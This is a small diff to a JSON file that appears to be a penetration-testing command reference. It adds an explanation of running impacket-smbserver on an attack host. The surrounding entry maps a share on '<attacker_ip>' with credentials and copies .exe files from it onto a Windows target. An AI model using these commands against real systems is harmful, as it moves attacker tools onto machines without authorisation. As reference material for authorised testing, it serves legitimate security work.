@@ -126,5 +126,6 @@
       "command": "net use n: \\\\<attacker_ip>\\share /user:<user> <pass>\ncopy n:\\*.exe C:\\Tools\\",
       "label": "net"
     }
-  ]
+  ],
+  "explain": "Stands up an SMB server on your attack host to serve/receive files:\n  impacket-smbserver share   share name the target will map\n  -smb2support               enable SMB2/3 (needed by modern Windows)\n  /tmp/smbshare              the local folder backing the share\nThe target reaches it as \\\\<your-ip>\\share; add -user/-password when the target refuses unauthenticated guest SMB."
 }
